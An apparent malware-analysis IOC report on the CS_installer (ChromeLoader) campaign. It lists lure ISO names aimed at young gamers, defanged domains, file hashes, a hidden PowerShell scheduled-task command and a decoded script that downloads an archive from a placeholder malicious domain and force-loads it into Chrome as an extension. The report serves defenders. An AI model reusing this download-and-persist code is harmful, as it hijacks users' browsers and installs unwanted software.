# Observed malicious IOCs for the CS_installer Malware

### Date of first occurrence

01-04-2022

### Domains Observed

```
hxxps[://]learnataloukt[.]xyz
hxxps[://]brokenna[.]work
```

### Malicious ISO

The Naming convention of the ISOs appear to be targeting young adults.

```
Universal Chat Spammer.iso
Roblox Muscle Legends Script _ AutoFarm + More ....iso
[UPDATED] Bee Swarm Simulator Script GUI _ Hack....iso
This_Young_Maidenhead_Family_Now_Makes_15800_..._1.iso
How To Install Shaders For Minecraft 1.18.1_1....iso => reported by reddit user remuchiiee
```

https://www.virustotal.com/gui/file/fa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3

mounted ISO mainly contains:
```
\Device\CdRom0\CS_INSTALLER.EXE
\Device\CdRom0\CS_installer.exe.config
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\Microsoft.Win32.TaskScheduler.dll
```

### CS_installers

https://www.virustotal.com/gui/file/ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd  
https://www.virustotal.com/gui/file/5f57a4495b9ab853b9d2ab7d960734645ebe5765e8df3b778d08f86119e1695c  

### Scheduled Task

```
ChromeLoader

cmd /c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E <base64EncodedPayload>
```

### Snippet of base64 decoded powershell script

```powershell
$extPath = "$($env:LOCALAPPDATA)\chrome"
$confPath = "$extPath\conf.js"
$archiveName = "$($env:LOCALAPPDATA)\archive.zip"
$taskName = "ChromeLoader"
$domain = "SomeMaliciousDomain"

$isOpen = 0
$dd = 0
$ver = 0

(Get-WmiObject Win32_Process -Filter "name='chrome.exe'") | Select-Object CommandLine | ForEach-Object {
	if($_ -Match "load-extension"){
		break
	}

	$isOpen = 1
}

if($isOpen){

	if(-not(Test-Path -Path "$extPath")){

		try{
			wget "https://$domain/archive.zip" -outfile "$archiveName"
		}catch{
			break
		}

		Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
		Remove-Item -path "$archiveName" -Force

	}
	else{

		try{
			if (Test-Path -Path "$confPath")
			{
				$conf = Get-Content -Path $confPath
				$conf.Split(";") | ForEach-Object {
					if ($_ -Match "dd")
					{
						$dd = $_.Split('"')[1]
					}elseif ($_ -Match "ExtensionVersion")
					{
						$ver = $_.Split('"')[1]
					}
				}
			}
		}catch{}

		if ($dd -and $ver){


			try{

				$un = wget "https://$domain/un?did=$dd&ver=$ver"

				if($un -Match "$dd"){
					Unregister-ScheduledTask -TaskName "$taskName" -Confirm:$false
					Remove-Item -path "$extPath" -Force -Recurse
				}

			}catch{}

			try{
				wget "https://$domain/archive.zip?did=$dd&ver=$ver" -outfile "$archiveName"
			}
			catch{}

			if (Test-Path -Path "$archiveName"){
				Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
				Remove-Item -path "$archiveName" -Force
			}

		}

	}

	try{
		Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}
		start chrome --load-extension="$extPath", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble
	}catch{}

}
```

